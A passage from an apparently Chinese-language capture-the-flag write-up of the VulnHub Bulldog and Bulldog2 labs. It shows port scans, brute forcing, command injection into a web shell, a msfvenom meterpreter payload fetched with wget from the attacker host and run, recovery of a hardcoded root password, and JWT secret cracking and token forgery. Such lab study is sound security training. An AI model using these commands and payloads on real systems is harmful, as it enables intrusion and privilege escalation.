cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.003 days (since Sun Feb 16 21:45:10 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;257 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-6"><a class="markdownIt-Anchor" href="#web路径枚举-6"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.121/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.121&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121&#x2F;admin&#x2F;                                                  </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121&#x2F;dev&#x2F;                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.121&#x2F;robots.txt (CODE:200|SIZE:1071)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.31.121&#x2F;dev&#x2F;shell&#x2F; ----</span><br></pre></td></tr></table></figure><p>尝试爆破8080端口下的Web路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;admin&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;dev&#x2F;</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;robots.txt (CODE:200|SIZE:1071)</span><br><span class="line">                                                    </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;dev&#x2F;shell&#x2F; ----</span><br></pre></td></tr></table></figure><p>80端口与8080端口上的WEB服务的路径几乎一样，极可能是同一个站点。<br />访问两个WEB服务之后发现并无差别，先对80端口进行渗透。</p><h2 id="漏洞利用-6"><a class="markdownIt-Anchor" href="#漏洞利用-6"></a> 漏洞利用</h2><p>访问路径<code>/admin/</code>跳转至登录界面<br />简单尝试弱口令后无效</p><p>访问路径<code>/dev/shell/</code>时提示 <strong>&quot;Please authenticate with the server to use Web-Shell&quot;</strong><br />猜测需要在之前的登录界面中登入后才能访问</p><p>访问路径<code>/dev/</code>与<code>/</code>时发现一些人名<br />制作简易字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">cat dic</span><br><span class="line"></span><br><span class="line">Winston Churchy</span><br><span class="line">Bulldog Industries</span><br><span class="line">Alan Brooke</span><br><span class="line">alan@bulldogindustries.com</span><br><span class="line">william@bulldogindustries.com</span><br><span class="line">malik@bulldogindustries.com</span><br><span class="line">kevin@bulldogindustries.com</span><br><span class="line">ashley@bulldogindustries.com</span><br><span class="line">nick@bulldogindustries.com</span><br><span class="line">sarah@bulldogindustries.com</span><br><span class="line">admin@bulldogindustries.com</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">Sarah</span><br><span class="line">sarah</span><br><span class="line">Nick</span><br><span class="line">nick</span><br><span class="line">Ashley</span><br><span class="line">ashley</span><br><span class="line">Kevin</span><br><span class="line">kevin</span><br><span class="line">Malik</span><br><span class="line">malik</span><br><span class="line">William</span><br><span class="line">william</span><br><span class="line">Alan</span><br><span class="line">alan</span><br><span class="line">Brooke</span><br><span class="line">brooke</span><br><span class="line">Bulldog</span><br><span class="line">bulldog</span><br><span class="line">Industries</span><br><span class="line">industries</span><br><span class="line">Winston</span><br><span class="line">winston</span><br><span class="line">Churchy</span><br><span class="line">churchy</span><br></pre></td></tr></table></figure><p>使用burpsuite进行账户爆破<br />得到账户<code>nick:bulldog</code></p><p>登入之后得到提示<code>You don't have permission to edit anything.</code></p><p>此时再访问<code>/dev/shell/</code><br />WEB端执行系统命令 -&gt; 命令注入<br />简单尝试之后发现<code>ls|cat /etc/passwd</code>可以执行</p><p>但是这个WEB是基于python的Django架构，不存在写入一句话木马的方法。<br />大概有两种方法：</p><ul><li>nc连接(正向连接/反弹Shell)</li><li>wget下载后门程序</li></ul><p><strong>第一种方法</strong><br />直接返回500<br />pass</p><p><strong>第二种方法</strong><br />生成后门文件&amp;启动HTTP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 &gt; shell.py</span><br><span class="line">python -m SimpleHTTPServer 80 &amp;</span><br></pre></td></tr></table></figure><p>MSF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload python&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 2020</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>命令注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls|wget http:&#x2F;&#x2F;192.168.31.10&#x2F;shell.py</span><br><span class="line">ls|python shell.py</span><br></pre></td></tr></table></figure><p>在MSF中接收到Shell</p><h2 id="权限提升-6"><a class="markdownIt-Anchor" href="#权限提升-6"></a> 权限提升</h2><p>获取tty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>在路径<code>/home/bulldogadmin/</code>下发现隐藏路径<code>.hiddenadmindirectory</code></p><p>进入之后发现两个文件<code>note</code>，<code>customPermissionApp</code></p><p>先将两个文件复制至自己home目录下并更改权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp * &#x2F;home&#x2F;django&#x2F;</span><br><span class="line">chmod 700 note customPermissionApp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat note </span><br><span class="line"></span><br><span class="line">Nick,</span><br><span class="line"></span><br><span class="line">I&#39;m working on the backend permission stuff. Listen, it&#39;s super prototype but I think it&#39;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! </span><br><span class="line"></span><br><span class="line">It&#39;s great stuff! Once I&#39;m finished with it, a hacker wouldn&#39;t even be able to reverse it! Keep in mind that it&#39;s still a prototype right now. I am about to get it working with the Django user account. I&#39;m not sure how I&#39;ll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?</span><br><span class="line"></span><br><span class="line">Let me know what you think of it!</span><br><span class="line"></span><br><span class="line">-Ashley</span><br></pre></td></tr></table></figure><p>另外一个文件是elf文件，大概对于提权有帮助<br />直接执行则提示需要输入自己的密码，大概在执行<code>sudo su</code></p><p>用strings命令分析一下内容<br />看到一串有意思的字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SUPERultH</span><br><span class="line">imatePASH</span><br><span class="line">SWORDyouH</span><br><span class="line">CANTget</span><br></pre></td></tr></table></figure><p>可以猜测密码是<code>SUPERultHimatePASHSWORDyouHCANTget</code><br />或<code>SUPERultimatePASSWORDyouCANTget</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">SUPERultimatePASSWORDyouCANTget</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/yufusec/p/9179625.html">Burp.Intruder</a></p></blockquote><hr /><h1 id="bulldog2"><a class="markdownIt-Anchor" href="#bulldog2"></a> <a href="https://www.vulnhub.com/entry/bulldog-2,246/">bulldog2</a></h1><p><code>2020/02/20 16:35:33</code></p><h2 id="端口扫描-7"><a class="markdownIt-Anchor" href="#端口扫描-7"></a> 端口扫描</h2><p><code>nmap -sV -p 1-65535 -T 5 -n -A -v 192.168.31.233</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.233</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65534 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-cors: HEAD GET POST PUT DELETE PATCH</span><br><span class="line">|_http-favicon: Unknown favicon MD5: B9AA7C338693424AAE99599BEC875B5F</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx&#x2F;1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Bulldog.social</span><br><span class="line">MAC Address: 08:00:27:FE:62:D8 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 43.190 days (since Tue Jan  7 22:59:12 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;253 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-7"><a class="markdownIt-Anchor" href="#web路径枚举-7"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.233/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.233&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.233&#x2F;assets (CODE:301|SIZE:179)                                           </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.233&#x2F;favicon.ico (CODE:200|SIZE:5430)</span><br></pre></td></tr></table></figure><p>dirb扫描路径时没有发现有价值的信息<br />手工登录网页时发现路径<code>/login</code>，<code>/register</code>，<code>/about</code></p><ul><li>路径<code>/</code>下有一些用户评论</li><li>路径<code>/login</code>下存在登录点</li><li>路径<code>/register</code>提示无法注册</li></ul><h2 id="漏洞利用-7"><a class="markdownIt-Anchor" href="#漏洞利用-7"></a> 漏洞利用</h2><ul><li>账户爆破</li></ul><p>构造字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">cat dic</span><br><span class="line"></span><br><span class="line">Bulldog</span><br><span class="line">bulldog</span><br><span class="line">Social</span><br><span class="line">social</span><br><span class="line">Johnathan Abbey</span><br><span class="line">Johnathan</span><br><span class="line">johnathan</span><br><span class="line">Abbey</span><br><span class="line">abbey</span><br><span class="line">Sarah Dubree</span><br><span class="line">Sarah</span><br><span class="line">sarah</span><br><span class="line">Dubree</span><br><span class="line">dubree</span><br><span class="line">William Katz</span><br><span class="line">William</span><br><span class="line">william</span><br><span class="line">Katz</span><br><span class="line">katz</span><br><span class="line">Winston Churchy</span><br><span class="line">Winston</span><br><span class="line">winston</span><br><span class="line">Churchy</span><br><span class="line">churchy</span><br><span class="line">Bulldog Industries</span><br><span class="line">Industries</span><br><span class="line">industries</span><br><span class="line">network</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">123456</span><br><span class="line">a123456</span><br></pre></td></tr></table></figure><p>使用burpsuite进行爆破，失败</p><ul><li>账户注册</li></ul><p>审计js文件，搜索&quot;register&quot;<br />发现两处与上传有关的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">return l.prototype.registerUser &#x3D; function(l) &#123;</span><br><span class="line">                var n &#x3D; new x.Headers;</span><br><span class="line">                return n.append(&quot;Content-Type&quot;, &quot;application&#x2F;json&quot;),</span><br><span class="line">                this.http.post(&quot;&#x2F;users&#x2F;register&quot;, l, &#123;</span><br><span class="line">                    headers: n</span><br><span class="line">                &#125;).map(function(l) &#123;</span><br><span class="line">                    return l.json()</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">l.prototype.onRegisterSubmit &#x3D; function() &#123;</span><br><span class="line">var l &#x3D; this,</span><br><span class="line">n &#x3D; &#123;</span><br><span class="line">        name: this.name,</span><br><span class="line">        email: this.email,</span><br><span class="line">        username: this.username,</span><br><span class="line">        password: this.password</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>猜测可以以POST方式请求路径<code>/users/register</code>，并附带相应格式的json数据即可完成注册</p><p>在burp中构造请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;users&#x2F;register HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.31.233</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">content-type: application&#x2F;json</span><br><span class="line">Content-Length: 84</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;abc&quot;,</span><br><span class="line">&quot;email&quot;: &quot;abc@abc.abc&quot;,</span><br><span class="line">&quot;username&quot;: &quot;abc&quot;,</span><br><span class="line">&quot;password&quot;: &quot;abc&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到响应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.14.0 (Ubuntu)</span><br><span class="line">Date: Thu, 20 Feb 2020 09:32:26 GMT</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 40</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">ETag: W&#x2F;&quot;28-r22PRevV1bosgiTQ0L7&#x2F;zW61meQ&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true,&quot;msg&quot;:&quot;User registered&quot;&#125;</span><br></pre></td></tr></table></figure><p>使用账户<code>abc:abc</code>成功登入</p><p>登入之后发现自己不能执行任何功能，开始垂直提权</p><ul><li>垂直提权</li></ul><p>在登入时发现一次http交互中带有一段json</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;success&quot;:true,</span><br><span class="line">    &quot;token&quot;:&quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJhYmMiLCJlbWFpbCI6ImFiY0BhYmMuYWJjIiwidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciJ9LCJpYXQiOjE1ODIxOTE2NTYsImV4cCI6MTU4Mjc5NjQ1Nn0.zM0g_sVeMr4b5j5TYVDBmpVbliuQct6kGiuDRhDLRPg&quot;,</span><br><span class="line">    &quot;user&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;username&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;email&quot;:&quot;abc@abc.abc&quot;,</span><br><span class="line">        &quot;auth_level&quot;:&quot;standard_user&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析JWT得到如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</span><br><span class="line">&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;standard_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;</span><br></pre></td></tr></table></figure><p>再审计js，查找&quot;auth_level&quot;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">l.prototype.isAdmin&#x3D;function()</span><br><span class="line">&#123;</span><br><span class="line">    var l&#x3D;localStorage.getItem(&quot;user&quot;);</span><br><span class="line">    return null!&#x3D;&#x3D;l &amp;&amp; &quot;master_admin_user&quot;&#x3D;&#x3D;JSON.parse(l).auth_level</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现&quot;master_admin_user&quot;<br />可以尝试修改JWT来尝试提权</p><p>尝试爆破JWT秘钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;brendan-rius&#x2F;c-jwt-cracker</span><br><span class="line">cd c-jwt-cracker</span><br><span class="line">chmod +x jwtcrack</span><br><span class="line">.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJhYmMiLCJlbWFpbCI6ImFiY0BhYmMuYWJjIiwidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciJ9LCJpYXQiOjE1ODIxOTE2NTYsImV4cCI6MTU4Mjc5NjQ1Nn0.zM0g_sVeMr4b5j5TYVDBmpVbliuQct6kGiuDRhDLRPg abcdefghijklmnopqrstuvwxyz 6</span><br></pre></td></tr></table></figure><p>得到秘钥为&quot;secret&quot;</p><p>修改JWT数据内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</span><br><span class="line">&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;master_admin_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;</span><br></pre></td></tr></table></figure><p>伪造JWT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip install pyjwt</span><br><span class="line">python</span><br><span class="line">import jwt</span><br><span class="line">jwt.encode(&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;master_admin_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;, &#39;secret&#39;, algorithm&#x3D;&#39;HS256&#39;)</span><br><span class="line">    &#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1ODIxOTE2NTYsInBheWxvYWQiOnsidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoibWFzdGVyX2FkbWluX3VzZXIiLCJuYW1lIjoiYWJjIiwiZW1haWwiOiJhYmNAYWJjLmFiYyJ9LCJleHAiOjE1ODI3OTY0NTZ9.snQ_kH-0xRB9BWxbIMyxD1sOhFzp9-TKp5QYIPZ-kpk&#39;</span><br></pre></td></tr></table></figure><p>在burp中开启拦截HTTP响应，登出账户并登入，用如下的数据代替身份校验步骤的JWT数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;success&quot;:true,</span><br><span class="line">    &quot;token&quot;:&quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1ODIxOTE2NTYsInBheWxvYWQiOnsidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoibWFzdGVyX2FkbWluX3VzZXIiLCJuYW1lIjoiYWJjIiwiZW1haWwiOiJhYmNAYWJjLmFiYyJ9LCJleHAiOjE1ODI3OTY0NTZ9.snQ_kH-0xRB9BWxbIMyxD1sOhFzp9-TKp5QYIPZ-kpk&quot;,</span><br><span class="line">    &quot;user&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;username&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;email&quot;:&quot;abc@abc.abc&quot;,</span><br><span class="line">        &quot;auth_level&quot;:&quot;master_admin_user&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得admin权限<br />在dashboard发现一个Link+登入点<br />尝试爆破，失败</p><ul><li>报错信息<br />访问路径<code>/%aa</code><br />获得报错信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">URIError: Failed to decode param &#39;&#x2F;%aa&#39;</span><br><span class="line">    at decodeURIComponent (&lt;anonymous&gt;)</span><br><span class="line">    at decode_param (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:172:12)</span><br><span class="line">    at Layer.match (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:123:27)</span><br><span class="line">    at matchLayer (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:574:18)</span><br><span class="line">    at next (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:220:15)</span><br><span class="line">    at SessionStrategy.strategy.pass (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:338:9)</span><br><span class="line">    at SessionStrategy.authenticate (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;strategies&#x2F;session.js:75:10)</span><br><span class="line">    at attempt (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:361:16)</span><br><span class="line">    at authenticate (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:362:7)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at trim_prefix 